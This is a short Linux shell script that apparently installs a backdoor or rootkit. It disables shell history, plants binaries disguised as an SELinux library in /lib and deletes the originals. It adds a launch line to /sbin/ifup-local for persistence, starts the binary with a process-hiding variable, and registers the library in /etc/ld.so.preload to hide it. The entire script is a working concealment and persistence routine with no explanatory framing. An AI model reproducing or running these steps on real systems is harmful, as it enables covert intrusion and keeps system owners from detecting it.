
unset HISTFILE

cp ./libxselinux /lib/libxselinux
cp ./libxselinux.so /lib/libxselinux.so
rm ./libxselinux.so 
rm ./libxselinux 

chmod 755 /lib/libxselinux
chmod 755 /lib/libxselinux.so
chmod +x  /lib/libxselinux
#chmod u+s /lib/libxselinux

echo 'HIDE_THIS_SHELL=x /lib/libxselinux 1 & ' >> /sbin/ifup-local
chmod +x /sbin/ifup-local

HIDE_THIS_SHELL=x /lib/libxselinux 1 &

echo /lib/libxselinux.so > /etc/ld.so.preload